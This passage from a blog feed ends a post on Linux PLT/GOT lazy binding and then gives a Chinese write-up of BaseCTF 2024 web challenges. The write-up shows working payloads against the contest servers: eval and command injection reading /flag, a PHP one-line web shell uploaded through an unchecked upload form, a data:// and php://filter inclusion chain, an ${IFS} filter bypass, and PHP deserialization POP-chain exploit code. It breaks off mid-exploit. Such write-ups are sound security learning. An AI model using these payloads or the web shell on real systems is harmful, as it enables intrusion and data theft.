class="line-numbers-rows"><span></span><span></span></span></code></pre><p>后续再次调用<code>system</code>函数时会通过<code>system_plt</code>跳转到<code>system_got</code>直接得到<code>system</code>函数的真实地址</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><code>plt</code>中是汇编指令，通过<code>jmp got</code>跳转到<code>got</code>表</li><li>第一次调用之前<code>got</code>表存放了<code>plt</code>第二条汇编指令的地址，如果没开<code>pie</code>那么这个地址是已知的</li><li>第一次调用时通过<code>jmp got[1]</code>调用<code>dl_runtime_resolve</code>并以<code>got[0]</code>为基址找到函数真实地址，所以在延迟绑定之前不能覆盖<code>got[0]</code>和<code>got[1]</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学&lt;code&gt;pwn&lt;/code&gt;的时候了解到&lt;code&gt;linux&lt;/code&gt;存在延迟绑定机制，延迟绑定之后&lt;code&gt;plt-&amp;gt;got-&amp;gt;函数真实地址&lt;/code&gt;，这两天比赛遇到问题了才去关注了一下延迟绑定的具体过程&lt;/p&gt;
&lt;h2 id=&quot;概念&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="Linux" scheme="https://starrysky1004.github.io/categories/Linux/"/>
    
    
    <category term="linux" scheme="https://starrysky1004.github.io/tags/linux/"/>
    
    <category term="延迟绑定" scheme="https://starrysky1004.github.io/tags/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/"/>
    
  </entry>
  
  <entry>
    <title>2024BaseCTF-Web部分题解</title>
    <link href="https://starrysky1004.github.io/2024/09/26/2024basectf-web-bu-fen-ti-jie/2024basectf-web-bu-fen-ti-jie/"/>
    <id>https://starrysky1004.github.io/2024/09/26/2024basectf-web-bu-fen-ti-jie/2024basectf-web-bu-fen-ti-jie/</id>
    <published>2024-09-26T09:10:23.000Z</published>
    <updated>2024-09-26T09:26:03.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h2><p>直接查看源代码，注释里有<code>flag</code></p><h2 id="HTTP是什么呀"><a href="#HTTP是什么呀" class="headerlink" title="HTTP是什么呀"></a>HTTP是什么呀</h2><p><code>bp</code>抓包改<code>http</code>参数</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /?basectf=we1c%2500me  HTTP/1.1<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">challenge.basectf.fun:33834</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span><span class="token header-value">Base</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span><span class="token header-value">Base</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span><span class="token header-value">c00k13=i can't eat it</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">9</span></span>Base=fl@g<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会得到以下内容，<code>base64</code>解码即可</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">302</span> <span class="token reason-phrase string">Found</span></span><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">nginx/1.18.0</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 15 Aug 2024 07:05:41 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">X-Powered-By</span><span class="token punctuation">:</span> <span class="token header-value">PHP/7.4.27</span></span><span class="token header"><span class="token header-name keyword">Location</span><span class="token punctuation">:</span> <span class="token header-value">success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>客户端重定向</strong>：</p><ul><li>服务器在响应中返回一个带有302状态码的响应头，指示浏览器进行跳转。</li><li>例如，服务器端脚本通过<code>header(&quot;Location: success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==&quot;);</code>指令将HTTP响应状态设置为302，然后浏览器会自动访问<code>success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==</code>页面。</li></ul><h2 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>get</code>传参给<code>eval</code>执行，直接传<code>system(&#39;cat /flag&#39;);</code>，即<code>url?DT=system(&#39;cat /flag&#39;);</code></p><h2 id="EncirclingGame"><a href="#EncirclingGame" class="headerlink" title="EncirclingGame"></a>EncirclingGame</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">A simple game<span class="token punctuation">,</span> enjoy it <span class="token keyword">and</span> get the flag when you complete it<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>纯游戏题，通关得到<code>flag</code></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>文件上传漏洞，没有检测文件类型，直接传个木马，然后蚁剑连接</p><p><code>test.php</code>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Aura酱的礼物"><a href="#Aura酱的礼物" class="headerlink" title="Aura酱的礼物"></a>Aura酱的礼物</h2><p><code>data</code>伪协议 <code>ssrf</code> 文件包含</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Aura 酱，欢迎回家~</span><span class="token comment">// 这里有一份礼物，请你签收一下哟~</span><span class="token variable">$pen</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pen'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$pen</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Aura'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这是 Aura 的礼物，你不是 Aura！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span><span class="token variable">$challenge</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://jasmineaura.github.io'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这不是 Aura 的博客！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$blog_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$blog_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'已经收到Kengwang的礼物啦'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请去博客里面写下感想哦~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span><span class="token variable">$gift</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gift'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$gift</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>post</code>参数：<code>pen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@challenge.basectf.fun:21758/&amp;gift=php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="一起吃豆豆"><a href="#一起吃豆豆" class="headerlink" title="一起吃豆豆"></a>一起吃豆豆</h2><p><code>index.js</code>里有一行<code>context.fillText(_LIFE ? atob(&quot;QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==&quot;) : &#39;GAME OVER&#39;, this.x, this.y);，base64</code>解码得到<code>flag</code></p><h2 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h2><p>系统命令执行，不会直接显示，所以放到其他文件里再访问文件：<code>cmd=cat /flag &gt; ./1.txt</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="easy-ser"><a href="#easy-ser" class="headerlink" title="easy_ser"></a>easy_ser</h2><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"I can not believes!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token variable">$nononono</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"lalalla"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">kw</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ALL Done!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"什么，你竟敢不认可?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">over</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('cat /flag');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"happy happy happy!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are over!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ser'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"I can not believes!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token variable">$nononono</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"lalalla"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">kw</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ALL Done!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"什么，你竟敢不认可?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">over</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"getflag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$re</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">re</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pwn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$web</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$misc</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Misc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pwn</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">;</span><span class="token variable">$pwn</span><span class="token operator">-></span><span class="token property">over</span> <span class="token operator">=</span> <span class="token variable">$misc</span><span class="token punctuation">;</span><span class="token variable">$re</span><span class="token operator">-></span><span class="token property">chu0</span> <span class="token operator">=</span> <span class="token variable">$pwn</span><span class="token punctuation">;</span><span class="token variable">$web</span><span class="token operator">-></span><span class="token property">kw</span> <span class="token operator">=</span> <span class="token variable">$re</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$web</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终构造：<code>O:3:&quot;web&quot;:2:&#123;s:2:&quot;kw&quot;;O:2:&quot;re&quot;:1:&#123;s:4:&quot;chu0&quot;;O:3:&quot;pwn&quot;:2:&#123;s:4:&quot;dusk&quot;;s:4:&quot;gods&quot;;s:4:&quot;over&quot;;O:4:&quot;Misc&quot;:2:&#123;s:7:&quot;nothing&quot;;N;s:4:&quot;flag&quot;;N;&#125;&#125;&#125;s:2:&quot;dt&quot;;N;&#125;</code></p><h2 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h2><p>绕过空格：<code>cmd=cat$&#123;IFS&#125;/flag</code></p><h2 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h2><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>  <span class="token keyword">private</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo 123;'</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>  <span class="token keyword">private</span> <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello, World!'</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Shark says:'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token variable">$sea_ani</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">animal</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'In a deep deep sea, there is a '</span> <span class="token operator">.</span> <span class="token variable">$sea_ani</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">see</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$nature</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-php" data-language="php"><code 